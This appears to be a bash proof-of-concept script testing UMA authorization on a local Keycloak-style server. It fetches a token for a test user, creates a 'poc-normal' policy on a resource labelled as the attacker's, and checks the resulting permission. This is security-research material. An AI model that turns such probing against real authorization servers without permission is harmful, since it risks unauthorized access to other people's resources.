#!/usr/bin/env bash
set -euo pipefail
BASE='http://127.0.0.1:8080/realms/anypoc'
TOKEN="$BASE/protocol/openid-connect/token"
POLICY_BASE="$BASE/authz/protection/uma-policy"
ATTACKER_RES='187c7e08-af92-4e1f-bf3d-45569369b124'
MAT=$(curl -s -X POST "$TOKEN" -d grant_type=password -d client_id=resource-server-test -d client_secret=secret -d username=marta -d password=password | jq -r .access_token)
BODY=$(jq -nc '{name:"poc-normal",scopes:["Scope A"],users:["marta"]}')
echo "$BODY"
echo
curl -i -s -X POST "$POLICY_BASE/$ATTACKER_RES" \
  -H "Authorization: Bearer $MAT" \
  -H 'Content-Type: application/json' \
  -d "$BODY"
echo
echo 'auth result for attacker resource after create:'
curl -i -s -X POST "$TOKEN" \
  -H "Authorization: Bearer $MAT" \
  -d grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  -d audience=resource-server-test \
  -d permission="$ATTACKER_RES#Scope A"
